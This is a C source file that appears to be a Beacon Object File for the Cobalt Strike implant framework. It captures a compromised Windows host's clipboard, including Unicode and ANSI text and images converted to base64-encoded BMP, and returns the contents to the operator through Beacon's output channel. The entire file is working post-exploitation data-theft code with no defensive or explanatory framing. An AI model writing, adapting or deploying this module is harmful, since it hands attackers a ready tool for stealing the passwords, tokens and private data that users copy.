#include "beacon.h"
#include "common.h"

VOID OutputClipboard(const wchar_t* pWide) {
    int utf8Len = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, pWide, -1, NULL, 0, NULL, NULL);
    char* utf8Buf = (char*)MemAlloc(utf8Len + 2);
    if (!utf8Buf) return;

    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, pWide, -1, utf8Buf, utf8Len, NULL, NULL);
    utf8Buf[utf8Len - 1] = '\n';
    utf8Buf[utf8Len] = '\0';

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Retrieved clipboard contents (%d bytes):\n\n", utf8Len);
    BeaconOutput(CALLBACK_OUTPUT, utf8Buf, utf8Len);
    MemFree(utf8Buf);
}

VOID CaptureClipboard(int monitor) {

    if (!USER32$OpenClipboard(NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open clipboard: %lu\n", KERNEL32$GetLastError());
        return;
    }

    // Unicode
    if (USER32$IsClipboardFormatAvailable(CF_UNICODETEXT)){

        HANDLE hData = USER32$GetClipboardData(CF_UNICODETEXT);
        if (!hData){
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve clipboard data: %lu\n", KERNEL32$GetLastError());
            USER32$CloseClipboard();
            return;
        }

        wchar_t* pWide = (wchar_t*)KERNEL32$GlobalLock(hData);
        if (!pWide){
            BeaconPrintf(CALLBACK_ERROR, "[-] GlobalLock failed: %lu\n", KERNEL32$GetLastError());
            USER32$CloseClipboard();
            return;
        }

        OutputClipboard(pWide);
        KERNEL32$GlobalUnlock(hData);
    }

    // ANSI
    else if (USER32$IsClipboardFormatAvailable(CF_TEXT)){

        HANDLE hData = USER32$GetClipboardData(CF_TEXT);
        if (!hData){
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve clipboard data: %lu\n", KERNEL32$GetLastError());
            USER32$CloseClipboard();
            return;
        }

        char* pText = (char*)KERNEL32$GlobalLock(hData);
        if (!pText){
            BeaconPrintf(CALLBACK_ERROR, "[-] GlobalLock failed: %lu\n", KERNEL32$GetLastError());
            USER32$CloseClipboard();
            return;
        }

        int wLen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, pText, -1, NULL, 0);
        wchar_t* pWide = (wchar_t*)MemAlloc(wLen * sizeof(wchar_t));
        if (pWide) {
            KERNEL32$MultiByteToWideChar(CP_ACP, 0, pText, -1, pWide, wLen);
            OutputClipboard(pWide);
            MemFree(pWide);
        }

        KERNEL32$GlobalUnlock(hData);
    }

    // Image, encoded as base64 BMP
    else if (USER32$IsClipboardFormatAvailable(CF_DIB)){

        // Capturing images does not work well with async execution, as the large amount of data blocks 
        // BeaconOutput and subsequently prevents BeaconWakeup from being called, resulting in the data 
        // to be sent back only on the next checkin.
        if (monitor){
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Monitor mode does not support retrieval of images from the clipboard.\n");
            USER32$CloseClipboard();
            return;
        }

        HANDLE hData = USER32$GetClipboardData(CF_DIB);
        if (!hData){
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve clipboard data: %lu\n", KERNEL32$GetLastError());
            USER32$CloseClipboard();
            return;
        }

        SIZE_T dibSize = KERNEL32$GlobalSize(hData);
        LPVOID pDib = KERNEL32$GlobalLock(hData);
        if (!pDib){
            BeaconPrintf(CALLBACK_ERROR, "[-] GlobalLock failed: %lu\n", KERNEL32$GetLastError());
            USER32$CloseClipboard();
            return;
        }

        BITMAPINFOHEADER* bih = (BITMAPINFOHEADER*)pDib;

        DWORD paletteSize = 0;
        if (bih->biBitCount <= 8)
            paletteSize = (bih->biClrUsed ? bih->biClrUsed : (1 << bih->biBitCount)) * sizeof(RGBQUAD);

        if (bih->biCompression == BI_BITFIELDS)
            paletteSize += 3 * sizeof(DWORD);

        if (bih->biSizeImage == 0)
        bih->biSizeImage = (DWORD)dibSize - sizeof(BITMAPINFOHEADER) - paletteSize;

        DWORD pixelOffset = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + paletteSize;
        SIZE_T totalSize  = sizeof(BITMAPFILEHEADER) + dibSize;

        BYTE* bmpBuf = (BYTE*)MemAlloc(totalSize);
        if (!bmpBuf){
            KERNEL32$GlobalUnlock(hData);
            USER32$CloseClipboard();
            return;
        }

        BITMAPFILEHEADER* bfh = (BITMAPFILEHEADER*)bmpBuf;
        bfh->bfType    = 0x4D42;
        bfh->bfSize    = (DWORD)totalSize;
        bfh->bfOffBits = pixelOffset;

        MSVCRT$memcpy(bmpBuf + sizeof(BITMAPFILEHEADER), pDib, dibSize);
        KERNEL32$GlobalUnlock(hData);

        static const char b64table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        SIZE_T b64Len = ((totalSize + 2) / 3) * 4 + 2;
        char* b64Buf = (char*)MemAlloc(b64Len);
        if (b64Buf){
            SIZE_T i, j;
            for (i = 0, j = 0; i < totalSize;) {
                DWORD a = i < totalSize ? bmpBuf[i++] : 0;
                DWORD b = i < totalSize ? bmpBuf[i++] : 0;
                DWORD c = i < totalSize ? bmpBuf[i++] : 0;
                DWORD triple = (a << 16) | (b << 8) | c;
                b64Buf[j++] = b64table[(triple >> 18) & 0x3F];
                b64Buf[j++] = b64table[(triple >> 12) & 0x3F];
                b64Buf[j++] = b64table[(triple >>  6) & 0x3F];
                b64Buf[j++] = b64table[(triple      ) & 0x3F];
            }
            if (totalSize % 3 >= 1) b64Buf[j-1] = '=';
            if (totalSize % 3 == 1) b64Buf[j-2] = '=';
            b64Buf[j] = '\n';
            b64Buf[j + 1] = '\0';

            BeaconPrintf(CALLBACK_OUTPUT, "[+] Retrieved clipboard contents (%d bytes):\n", totalSize);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Encoded Image: %s", b64Buf);
            MemFree(b64Buf);
        }

        MemFree(bmpBuf);
    }

    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Unsupported clipboard data type.\n");
    }

    USER32$CloseClipboard();
}

VOID go(char* args, int argc) {

    datap parser = { 0 };
    int monitor = 0;

    BeaconDataParse(&parser, args, argc);
    monitor = BeaconDataInt(&parser);
    if (BeaconDataLength(&parser) >= 4) {
        (void)BeaconDataInt(&parser);
    }

    if (monitor) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Async monitor mode is not supported in this build. Use monitor=0.\n");
        return;
    }

    CaptureClipboard(0);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
}
